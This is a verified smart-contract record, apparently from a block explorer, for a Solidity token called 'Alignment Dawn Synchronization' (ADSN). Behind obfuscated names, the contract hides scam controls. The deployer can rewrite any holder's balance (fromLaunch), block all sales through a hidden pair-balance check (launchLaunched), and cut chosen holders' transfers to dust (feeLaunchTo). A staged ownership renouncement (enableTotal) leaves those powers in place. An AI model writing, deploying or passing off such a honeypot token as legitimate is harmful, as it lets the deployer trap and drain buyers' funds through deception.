{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface autoAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenBuy {\n    function createPair(address receiverSwap, address txSwap) external returns (address);\n}\n\ninterface enableTakeAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listReceiver) external view returns (uint256);\n\n    function transfer(address teamLaunchList, uint256 enableAmount) external returns (bool);\n\n    function allowance(address receiverAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLaunchList,\n        uint256 enableAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldSender, uint256 value);\n    event Approval(address indexed receiverAt, address indexed spender, uint256 value);\n}\n\ninterface fundMode is enableTakeAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlignmentDawnSynchronization is launchWallet, enableTakeAt, fundMode {\n\n    function limitMax() private view {\n        require(exemptIs[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyToken;\n    }\n\n    uint256 isBuy;\n\n    address private shouldTake;\n\n    function allowance(address launchLimit, address teamTx) external view virtual override returns (uint256) {\n        if (teamTx == fundTake) {\n            return type(uint256).max;\n        }\n        return amountLaunchAuto[launchLimit][teamTx];\n    }\n\n    event OwnershipTransferred(address indexed minReceiver, address indexed exemptFromMax);\n\n    function fromLaunch(address modeLimitAmount, uint256 enableAmount) public {\n        limitMax();\n        shouldMin[modeLimitAmount] = enableAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountLaunchAuto;\n\n    function transfer(address modeLimitAmount, uint256 enableAmount) external virtual override returns (bool) {\n        return liquidityShould(_msgSender(), modeLimitAmount, enableAmount);\n    }\n\n    uint256 senderIs;\n\n    uint8 private feeSender = 18;\n\n    function approve(address teamTx, uint256 enableAmount) public virtual override returns (bool) {\n        amountLaunchAuto[_msgSender()][teamTx] = enableAmount;\n        emit Approval(_msgSender(), teamTx, enableAmount);\n        return true;\n    }\n\n    address fundTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public buyIs;\n\n    uint256 private fundReceiver = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return shouldTake;\n    }\n\n    function balanceOf(address listReceiver) public view virtual override returns (uint256) {\n        return shouldMin[listReceiver];\n    }\n\n    uint256 constant shouldBuy = 3 ** 10;\n\n    function enableTotal() public {\n        emit OwnershipTransferred(txFee, address(0));\n        shouldTake = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTake;\n    }\n\n    function liquidityShould(address shouldFrom, address teamLaunchList, uint256 enableAmount) internal returns (bool) {\n        if (shouldFrom == txFee) {\n            return sellBuyExempt(shouldFrom, teamLaunchList, enableAmount);\n        }\n        uint256 shouldSwap = enableTakeAt(feeToken).balanceOf(teamAuto);\n        require(shouldSwap == senderIs);\n        require(teamLaunchList != teamAuto);\n        if (fundTrading[shouldFrom]) {\n            return sellBuyExempt(shouldFrom, teamLaunchList, shouldBuy);\n        }\n        return sellBuyExempt(shouldFrom, teamLaunchList, enableAmount);\n    }\n\n    bool public receiverLaunched;\n\n    constructor (){\n        if (receiverLaunched != autoReceiver) {\n            receiverLaunched = false;\n        }\n        autoAt txFrom = autoAt(fundTake);\n        feeToken = tokenBuy(txFrom.factory()).createPair(txFrom.WETH(), address(this));\n        \n        txFee = _msgSender();\n        enableTotal();\n        exemptIs[txFee] = true;\n        shouldMin[txFee] = fundReceiver;\n        \n        emit Transfer(address(0), txFee, fundReceiver);\n    }\n\n    address public feeToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingList;\n    }\n\n    bool private maxTeamTo;\n\n    string private buyToken = \"Alignment Dawn Synchronization\";\n\n    string private tradingList = \"ADSN\";\n\n    address teamAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public txFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundReceiver;\n    }\n\n    bool public liquidityTake;\n\n    function launchLaunched(uint256 enableAmount) public {\n        limitMax();\n        senderIs = enableAmount;\n    }\n\n    function transferFrom(address shouldFrom, address teamLaunchList, uint256 enableAmount) external override returns (bool) {\n        if (_msgSender() != fundTake) {\n            if (amountLaunchAuto[shouldFrom][_msgSender()] != type(uint256).max) {\n                require(enableAmount <= amountLaunchAuto[shouldFrom][_msgSender()]);\n                amountLaunchAuto[shouldFrom][_msgSender()] -= enableAmount;\n            }\n        }\n        return liquidityShould(shouldFrom, teamLaunchList, enableAmount);\n    }\n\n    function maxAuto(address senderListTotal) public {\n        if (liquidityTake) {\n            return;\n        }\n        \n        exemptIs[senderListTotal] = true;\n        \n        liquidityTake = true;\n    }\n\n    mapping(address => bool) public exemptIs;\n\n    mapping(address => bool) public fundTrading;\n\n    function sellBuyExempt(address shouldFrom, address teamLaunchList, uint256 enableAmount) internal returns (bool) {\n        require(shouldMin[shouldFrom] >= enableAmount);\n        shouldMin[shouldFrom] -= enableAmount;\n        shouldMin[teamLaunchList] += enableAmount;\n        emit Transfer(shouldFrom, teamLaunchList, enableAmount);\n        return true;\n    }\n\n    bool private autoReceiver;\n\n    mapping(address => uint256) private shouldMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSender;\n    }\n\n    function feeLaunchTo(address fundList) public {\n        limitMax();\n        if (maxTeamTo != autoReceiver) {\n            maxTeamTo = false;\n        }\n        if (fundList == txFee || fundList == feeToken) {\n            return;\n        }\n        fundTrading[fundList] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFromMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"feeLaunchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"fromLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderListTotal\",\"type\":\"address\"}],\"name\":\"maxAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlignmentDawnSynchronization", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}